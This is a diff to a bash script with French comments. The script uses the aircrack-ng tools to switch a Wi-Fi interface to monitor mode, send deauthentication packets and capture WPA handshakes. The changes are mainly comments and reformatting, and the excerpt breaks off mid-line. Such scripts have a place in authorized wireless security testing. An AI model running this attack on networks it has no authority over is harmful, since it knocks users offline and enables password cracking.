@@ -16,6 +16,7 @@ for cmd in airmon-ng airodump-ng aireplay-ng; do
     fi
 done
 
+# Valeurs par défaut
 INTERFACE="wlan0"
 OUTPUT_DIR="wifi_captures"
 CHANNEL=6
@@ -34,14 +35,15 @@ EOF
     exit 1
 }
 
+# Analyse des options
 while getopts "i:c:o:t:d:h" opt; do
     case $opt in
-        i) INTERFACE="$OPTARG";;
-        c) CHANNEL="$OPTARG";;
-        o) OUTPUT_DIR="$OPTARG";;
-        t) CAPTURE_TIME="$OPTARG";;
-        d) DEAUTH_COUNT="$OPTARG";;
-        h|*) usage;;
+        i) INTERFACE="$OPTARG" ;;
+        c) CHANNEL="$OPTARG" ;;
+        o) OUTPUT_DIR="$OPTARG" ;;
+        t) CAPTURE_TIME="$OPTARG" ;;
+        d) DEAUTH_COUNT="$OPTARG" ;;
+        h|*) usage ;;
     esac
 done
 
@@ -52,6 +54,7 @@ mkdir -p "$OUTPUT_DIR"
 echo "[*] Activation du mode monitor sur $INTERFACE..."
 airmon-ng start "$INTERFACE" >/dev/null
 
+# Nettoyage en cas d'interruption
 cleanup() {
     if [[ -n "${AIRDUMP_PID:-}" ]]; then
         kill "$AIRDUMP_PID" 2>/dev/null || true
@@ -79,10 +82,4 @@ echo "[*] Attente du handshake pendant $CAPTURE_TIME s..."
 sleep "$CAPTURE_TIME"
 kill "$AIRDUMP_PID" 2>/dev/null || true
 
-HANDSHAKE_FILE=$(ls "$OUTPUT_DIR"/${CAP_BASENAME}-*.cap 2>/dev/null | head -n 1 || true)
-if [[ -f "$HANDSHAKE_FILE" ]]; then
-    echo "✅ Capture terminée. Fichier : $HANDSHAKE_FILE"
-else
-    echo "❌ Handshake non capturé" >&2
-fi
-
+HANDSHAKE_FILE=$(ls "$OUT_
